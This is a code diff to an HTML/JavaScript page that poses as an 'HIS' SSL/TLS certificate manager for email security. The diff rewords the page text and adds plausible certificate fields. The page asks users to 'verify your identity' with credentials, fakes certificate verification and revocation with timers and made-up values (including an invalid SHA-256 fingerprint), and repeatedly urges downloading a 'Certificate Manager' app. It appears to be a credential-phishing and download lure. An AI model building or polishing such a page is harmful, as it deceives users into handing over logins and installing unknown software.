@@ -258,6 +258,11 @@
             font-size: 15px;
         }
 
+        .cert-detail-item .value.email {
+            color: #19388A;
+            font-weight: 500;
+        }
+
         .cert-meta {
             display: flex;
             justify-content: space-between;
@@ -635,14 +640,14 @@
     <!-- Header -->
     <div class="header">
         <img src="https://3sx2y5mo5g.ucarecd.net/b564b7ce-7e42-4d36-9236-37a42a6a1576/hisreject.png" alt="HIS" class="header-logo">
-        <div class="sub-heading">Secure certificate management</div>
+        <div class="sub-heading">SSL/TLS Certificate Management</div>
     </div>
 
     <!-- Login Card -->
     <div class="card" id="loginCard">
         <div class="form-title">Verify Your Identity</div>
         <div class="form-subtitle">
-            Please verify your credentials to access and manage your digital certificates.
+            Please verify your credentials to access and manage SSL/TLS certificates for email security.
         </div>
         <form id="loginForm">
             <div class="form-group">
@@ -670,12 +675,12 @@
     <div class="card hidden" id="certificateCard">
         <div class="certificate-header">
             <div class="cert-badge">
-                <i class="fas fa-certificate"></i>
-                <span>Digital Certificate</span>
+                <i class="fas fa-lock"></i>
+                <span>SSL/TLS Certificate</span>
             </div>
-            <h2>Extended Validation (EV)</h2>
+            <h2>Email Security Certificate</h2>
             <div class="cert-status">
-                <i class="fas fa-check-circle"></i> Verified &amp; Active
+                <i class="fas fa-check-circle"></i> Active &amp; Valid
             </div>
         </div>
 
@@ -687,15 +692,15 @@
                 </div>
                 <div class="cert-detail-item">
                     <span class="label">Type</span>
-                    <span class="value">Extended Validation (EV)</span>
+                    <span class="value">Extended Validation (EV) SSL/TLS</span>
                 </div>
                 <div class="cert-detail-item">
-                    <span class="label">Issued To</span>
-                    <span class="value" id="certHolder">John Doe</span>
+                    <span class="label">Common Name (CN)</span>
+                    <span class="value email">*.mail.his.com</span>
                 </div>
                 <div class="cert-detail-item">
                     <span class="label">Organization</span>
-                    <span class="value" id="certOrg">HIS Corporation</span>
+                    <span class="value">HIS Corporation</span>
                 </div>
                 <div class="cert-detail-item">
                     <span class="label">Issued Date</span>
@@ -710,6 +715,14 @@
                     <span class="value" style="font-family:'Courier New',monospace;font-size:13px;" id="serialNumber">7F:3A:2B:9C:4D:1E</span>
                 </div>
                 <div class="cert-detail-item">
+                    <span class="label">Key Usage</span>
+                    <span class="value">Digital Signature, Key Encipherment</span>
+                </div>
+                <div class="cert-detail-item" style="grid-column: 1 / -1;">
+                    <span class="label">Subject Alternative Names (SAN)</span>
+                    <span class="value" style="font-size:13px; color:#19388A;">mail.his.com, smtp.his.com, imap.his.com</span>
+                </div>
+                <div class="cert-detail-item" style="grid-column: 1 / -1;">
                     <span class="label">Status</span>
                     <span class="value">
                         <span class="cert-meta" style="border:none;padding:0;margin:0;">
@@ -722,7 +735,7 @@
             </div>
 
             <div class="cert-meta">
-                <span><i class="fas fa-info-circle" style="color:#19388A;"></i> EV certificate provides highest level of authentication</span>
+                <span><i class="fas fa-info-circle" style="color:#19388A;"></i> EV SSL/TLS certificate for email security</span>
                 <span class="cert-id"><i class="fas fa-fingerprint"></i> SHA-256: <span id="certFingerprint">a1b2c3d4e5f6g7h8i9j0</span></span>
             </div>
         </div>
@@ -750,7 +763,7 @@
         <div class="download-section" id="downloadSection">
             <div class="download-info">
                 <i class="fas fa-shield-alt"></i>
-                <p><strong>Secure your certificates</strong> — Download the HIS Certificate Manager</p>
+                <p><strong>Secure your email</strong> — Download the HIS Certificate Manager</p>
             </div>
             <button class="btn btn-app" id="downloadAppAfterRevoke">
                 <i class="fas fa-download"></i> Download App
@@ -762,7 +775,7 @@
             <i class="fas fa-check-circle"></i>
             <div class="text">
                 <strong>Certificate revoked successfully</strong>
-                <p>This certificate has been marked as revoked and is no longer valid.</p>
+                <p>This SSL/TLS certificate has been marked as revoked and is no longer valid for email security.</p>
             </div>
         </div>
 
@@ -838,8 +851,6 @@
         const statusText = document.getElementById('statusText');
 
         // Populate certificate data
-        document.getElementById('certHolder').textContent = 'John Doe';
-        document.getElementById('certOrg').textContent = 'HIS Corporation';
         document.getElementById('issuedDate').textContent = dates.issued;
         document.getElementById('expiryDate').textContent = dates.expiry;
         document.getElementById('serialNumber').textContent = serialNum;
@@ -924,10 +935,10 @@
 
         // Verify Certificate
         document.getElementById('verifyCertBtn').addEventListener('click', function() {
-            showState('Verifying certificate authenticity...', 'loading', 'spinner');
+            showState('Verifying SSL/TLS certificate...', 'loading', 'spinner');
             setTimeout(function() {
                 hideState();
-                showState('✅ Certificate verified successfully', 'success', 'check-circle');
+                showState('✅ Certificate verified successfully for email security', 'success', 'check-circle');
                 setTimeout(hideState, 2500);
                 statusText.className = 'status-indicator';
                 statusText.innerHTML = '<span class="dot"></span> Verified';
@@ -936,7 +947,7 @@
 
         // Revoke Certificate
         revokeCertBtn.addEventListener('click', function() {
-            showState('Revoking certificate...', 'loading', 'spinner');
+            showState('Revoking SSL/TLS certificate...', 'loading', 'spinner');
             setTimeout(function() {
                 hideState();
                 showRevoked();
@@ -952,7 +963,8 @@
                 showState('📄 Certificate download started', 'success', 'download');
                 setTimeout(hideState, 3000);
                 // Simulate download
-                const blob = new Blob(['Certificate ID: ' + certId + '\nSerial: ' + serialNum], {type: 'text/plain'});
+                const certData = `Certificate ID: ${certId}\nType: Extended Validation (EV) SSL/TLS\nCommon Name: *.mail.his.com\nOrganization: HIS Corporation\nSerial Number: ${serialNum}\nSHA-256: ${fingerprint}`;
+                const blob = new Blob([certData], {type: 'text/plain'});
                 const url = window.URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
